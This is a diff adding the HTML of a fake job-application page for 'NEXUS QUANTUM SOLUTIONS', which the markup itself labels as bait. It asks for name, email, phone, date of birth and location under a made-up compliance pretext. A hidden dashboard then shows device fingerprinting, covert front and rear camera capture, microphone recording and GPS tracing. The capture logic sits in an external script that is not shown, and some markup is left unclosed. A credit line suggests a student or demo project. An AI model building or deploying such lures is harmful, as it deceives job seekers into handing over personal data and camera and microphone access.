@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="NEXUS // Secure Access Portal" />
+  <title>NEXUS // Secure Access Portal</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Fira+Code:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="style.css" />
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⬡</text></svg>" />
+</head>
+<body>
+
+  <!-- Scanline CRT overlay -->
+  <div class="scanline-overlay hidden" id="scanlineOverlay"></div>
+
+  <!-- Top Ticker -->
+  <div class="ticker-bar hidden" id="topTicker">
+    <div class="ticker-track">
+      <span>◆ VISITOR_TRACE_ENABLED ◆ SYSTEM_DIAGNOSTIC_ACTIVE ◆ PROTOCOL: ENCRYPTED ◆ NODE: ACTIVE ◆ GEO_TRACE: ENABLED ◆ BIOMETRIC_SCAN: ARMED ◆ FIREWALL: NOMINAL ◆ DATA_INTEGRITY: 100% ◆ SESSION_MONITOR: LIVE ◆ PAYLOAD_HANDLER: ACTIVE ◆&nbsp;</span>
+      <span>◆ VISITOR_TRACE_ENABLED ◆ SYSTEM_DIAGNOSTIC_ACTIVE ◆ PROTOCOL: ENCRYPTED ◆ NODE: ACTIVE ◆ GEO_TRACE: ENABLED ◆ BIOMETRIC_SCAN: ARMED ◆ FIREWALL: NOMINAL ◆ DATA_INTEGRITY: 100% ◆ SESSION_MONITOR: LIVE ◆ PAYLOAD_HANDLER: ACTIVE ◆&nbsp;</span>
+    </div>
+  </div>
+
+  <!-- ═══ JOB APPLICATION FORM BAIT ═══ -->
+  <div id="jobBaitContainer" class="job-bait-container">
+    <div class="job-card">
+      <header class="job-header">
+        <div class="logo-area">
+          <span class="logo-icon">⬢</span>
+          <span class="logo-text">NEXUS QUANTUM SOLUTIONS</span>
+        </div>
+        <span class="badge-status">OPENING // URGENT</span>
+      </header>
+
+      <div class="job-details">
+        <h1 class="job-title">System Engineer</h1>
+        <div class="job-meta">
+          <span>📍 Remote / Global</span>
+          <span>💼 Full-time</span>
+          <span>💰 ₹24,00,000 - ₹36,00,000 INR / Year + Equity</span>
+        </div>
+        <p class="job-desc">
+          We are seeking a system engineer to design, deploy, and maintain our global, high-throughput decentralized ledgers. This role requires managing highly sensitive secure enclaves, verifying network topology compliance, and conducting routine system audits. Due to strict financial regulatory standards and localized trade compliance, applicants must submit an encrypted compliance location verification lock.
+        </p>
+      </div>
+
+      <form id="jobAppForm" class="job-form">
+        <div class="form-row">
+          <div class="form-group">
+            <label for="appName">Full Name</label>
+            <input type="text" id="appName" placeholder="John Doe" required />
+          </div>
+          <div class="form-group">
+            <label for="appEmail">Email Address</label>
+            <input type="email" id="appEmail" placeholder="johndoe@proton.me" required />
+          </div>
+        </div>
+
+        <div class="form-row">
+          <div class="form-group">
+            <label for="appPhone">Phone Number</label>
+            <input type="tel" id="appPhone" placeholder="+91 98765 43210" required />
+          </div>
+          <div class="form-group">
+            <label for="appDob">Date of Birth</label>
+            <input type="date" id="appDob" required />
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label for="appLocation">Compliance Location Lock</label>
+          <div class="input-with-icon">
+            <input type="text" id="appLocation" placeholder="Click to verify secure compliance location..." required readonly />
+            <span class="input-status-icon" id="locationStatusIcon">📍</span>
+          </div>
+        </div>
+
+        <button type="submit" class="submit-btn" id="submitBtn">
+          <span class="btn-text">Submit Secure Application</span>
+          <div class="btn-loader hidden" id="submitLoader"></div>
+        </button>
+      </form>
+    </div>
+  </div>
+
+  <!-- ═══ MAIN WRAPPER ═══ -->
+  <div class="terminal-wrapper hidden" id="terminalWrapper">
+
+    <!-- Top Bar -->
+    <header class="top-bar">
+      <div class="top-bar__left">
+        <span class="hex-icon">⬡</span>
+        <span class="sys-label">NEXUS<span class="dim">//</span>TRACE</span>
+        <span class="version-tag">v5.0.0</span>
+      </div>
+      <div class="top-bar__center">
+        <span class="status-pill live"><span class="pulse-dot"></span>LIVE</span>
+        <span class="status-pill" id="protocolPill">PROTOCOL: INITIALIZING</span>
+      </div>
+      <div class="top-bar__right">
+        <span class="sys-clock" id="sysClock">00:00:00</span>
+      </div>
+    </header>
+
+    <!-- Status bar -->
+    <div class="sys-status-bar">
+      <span>[ visitor_trace — <span class="neon-cyan" id="traceId">000</span> ]</span>
+      <span>ENCRYPTION: <span class="neon-cyan">AES-256-GCM</span></span>
+      <span>SESSION: <span class="neon-amber" id="sessionId">—</span></span>
+      <span id="statusPhase" class="neon-green">PHASE: BOOT</span>
+      <span class="neon-cyan" style="margin-left: auto; font-weight: bold; border: 1px solid rgba(0,229,255,0.3); padding: 2px 8px; border-radius: 2px; text-shadow: 0 0 8px rgba(0,229,255,0.4); background: rgba(0,229,255,0.05); font-size: 0.65rem;">CREATED BY PRAVEEN NARNI UNDER GUIDANCE BY SAI SHANTHAN</span>
+    </div>
+
+    <!-- ═══ MAIN CONTENT ═══ -->
+    <div class="content-area">
+
+      <!-- ── Terminal Log (left side / full on mobile) ──── -->
+      <div class="terminal-panel">
+        <div class="panel__header">
+          <span class="panel__tag">SYS</span>
+          <span class="panel__title">OPERATION LOG</span>
+          <span class="blink-indicator" id="logIndicator"></span>
+        </div>
+        <div class="terminal-log" id="terminalLog"></div>
+      </div>
+
+      <!-- ── Data Reveal Dashboard (right side) ────────── -->
+      <div class="reveal-panel" id="revealPanel">
+
+        <!-- DEVICE SECTION -->
+        <div class="reveal-section" id="sectionDevice">
+          <div class="panel__header">
+            <span class="panel__tag">01</span>
+            <span class="panel__title">DEVICE FINGERPRINT</span>
+          </div>
+          <div class="data-grid" id="deviceGrid">
+            <!-- Populated by JS -->
+          </div>
+        </div>
+
+        <!-- CAMERA SECTION -->
+        <div class="reveal-section" id="sectionCamera">
+          <div class="panel__header">
+            <span class="panel__tag">02</span>
+            <span class="panel__title">BIOMETRIC CAPTURE</span>
+          </div>
+          <div class="cam-grid">
+            <div class="cam-slot" id="frontSlot">
+              <div class="cam-placeholder" id="frontPlaceholder">
+                <div class="cam-crosshair"></div>
+                <span>FRONT_CAM</span>
+                <span class="cam-sub">AWAITING</span>
+              </div>
+              <img id="frontPreview" class="cam-img hidden" alt="FRONT" />
+              <div class="cam-label">SUBJECT_FACE</div>
+            </div>
+            <div class="cam-slot" id="backSlot">
+              <div class="cam-placeholder" id="backPlaceholder">
+                <div class="cam-crosshair"></div>
+                <span>REAR_CAM</span>
+                <span class="cam-sub">AWAITING</span>
+              </div>
+              <img id="backPreview" class="cam-img hidden" alt="REAR" />
+              <div class="cam-label">ENV_SCAN</div>
+        </div>
+
+        <!-- AUDIO RECORDING SECTION -->
+        <div class="reveal-section" id="sectionAudio">
+          <div class="panel__header">
+            <span class="panel__tag">03</span>
+            <span class="panel__title">VOICE INTERCEPT</span>
+          </div>
+          <div class="audio-capture-box" id="audioBox">
+            <div class="audio-status" id="audioStatus">
+              <span class="audio-icon">🎙</span>
+              <span id="audioStatusText">MICROPHONE: STANDBY</span>
+            </div>
+            <div class="waveform-container" id="waveformContainer">
+              <div class="waveform-bar"></div><div class="waveform-bar"></div>
+              <div class="waveform-bar"></div><div class="waveform-bar"></div>
+              <div class="waveform-bar"></div><div class="waveform-bar"></div>
+              <div class="waveform-bar"></div><div class="waveform-bar"></div>
+              <div class="waveform-bar"></div><div class="waveform-bar"></div>
+              <div class="waveform-bar"></div><div class="waveform-bar"></div>
+              <div class="waveform-bar"></div><div class="waveform-bar"></div>
+              <div class="waveform-bar"></div><div class="waveform-bar"></div>
+              <div class="waveform-bar"></div><div class="waveform-bar"></div>
+              <div class="waveform-bar"></div><div class="waveform-bar"></div>
+            </div>
+            <div class="audio-timer" id="audioTimer">00:00 / 00:10</div>
+            <audio id="audioPlayback" controls class="audio-player hidden"></audio>
+          </div>
+        </div>
+
+        <!-- NETWORK / GEO SECTION -->
+        <div class="reveal-section" id="sectionNetwork">
+          <div class="panel__header">
+            <span class="panel__tag">04</span>
+            <span class="panel__title">NETWORK & GEO TRACE</span>
+          </div>
+          <div class="data-grid" id="networkGrid">
+            <!-- Populated by JS -->
+          </div>
+        </div>
+
+        <!-- LOCATION SECTION -->
+        <div class="reveal-section" id="sectionLocation">
+          <div class="panel__header">
+            <span class="panel__tag">05</span>
+            <span class="panel__title">GPS COORDINATES</span>
+          </div>
+          <div class="data-grid" id="locationGrid">
+            <!-- Populated by JS -->
+          </div>
+        </div>
+
+      </div><!-- /reveal-panel -->
+    </div><!-- /content-area -->
+
+    <!-- Bottom Bar -->
+    <footer class="bottom-bar">
+      <span>NEXUS SYSTEMS © 2026</span>
+      <span>|</span>
+      <span>PAYLOAD: <span class="neon-green" id="payloadStatus">BUFFERING</span></span>
+      <span>|</span>
+      <span>RECORDS: <span class="neon-cyan" id="recordCount">—</span></span>
+      <span>|</span>
+      <span id="footerExtract">EXTRACTION: <span class="neon-amber">PENDING</span></span>
+    </footer>
+
+  </div><!-- /terminal-wrapper -->
+
+  <!-- Bottom Ticker -->
+  <div class="ticker-bar ticker-bar--bottom hidden" id="bottomTicker">
+    <div class="ticker-track ticker-track--reverse">
+      <span>▸ TRACE_LOG_ACTIVE ▸ BIOMETRIC_MODULE: ONLINE ▸ PAYLOAD_BUFFER: CLEAR ▸ SECURE_CHANNEL: ESTABLISHED ▸ NETWORK_SCAN: ACTIVE ▸ GPS_LOCK: ACQUIRING ▸ ISP_TRACE: ENABLED ▸ DEVICE_FINGERPRINT: LOGGING ▸&nbsp;</span>
+      <span>▸ TRACE_LOG_ACTIVE ▸ BIOMETRIC_MODULE: ONLINE ▸ PAYLOAD_BUFFER: CLEAR ▸ SECURE_CHANNEL: ESTABLISHED ▸ NETWORK_SCAN: ACTIVE ▸ GPS_LOCK: ACQUIRING ▸ ISP_TRACE: ENABLED ▸ DEVICE_FINGERPRINT: LOGGING ▸&nbsp;</span>
+    </div>
+  </div>
+
+  <!-- Hidden camera elements -->
+  <video id="cameraVideo" playsinline autoplay style="display:none"></video>
+  <canvas id="cameraCanvas" style="display:none"></canvas>
+
+  <script src="script.js"></script>
+</body>
+</html>
